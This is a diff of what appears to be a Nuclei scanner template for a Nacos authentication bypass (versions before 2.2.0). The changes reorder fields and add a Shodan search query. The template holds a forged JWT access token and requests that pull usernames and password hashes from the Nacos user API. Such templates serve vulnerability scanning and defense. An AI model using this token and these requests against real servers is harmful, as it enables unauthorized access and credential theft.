@@ -1,5 +1,4 @@
 id: nacos-authentication-bypass
-
 info:
   name: Nacos < 2.2.0 - Authentication Bypass
   author: Esonhugh
@@ -14,43 +13,37 @@ info:
   classification:
     cpe: cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
     max-request: 2
+    product: nacos
+    shodan-query: title:"Nacos"
     vendor: alibaba
-  tags: auth-bypass,nacos,misconfig,jwt,vuln
-
+    verified: true
+  tags: auth-bypass,jwt,misconfig,nacos,vuln
 variables:
   token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g
-
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}"
-      - "{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}"
-
-    stop-at-first-match: true
-
-    matchers-condition: and
+  - extractors:
+      - json:
+          - .pageItems[]
+        name: extracted-credentials
+        part: body
+        type: json
     matchers:
-      - type: word
+      - condition: and
+        type: word
         words:
           - '"username":'
           - '"password":'
-        condition: and
-
-      - type: word
-        part: header
+      - part: header
+        type: word
         words:
-          - "application/json"
-
-      - type: status
-        status:
+          - application/json
+      - status:
           - 200
-
-    extractors:
-      - type: json
-        part: body
-        name: extracted-credentials
-        json:
-          - ".pageItems[]"
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}'
+      - '{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}'
+    stop-at-first-match: true
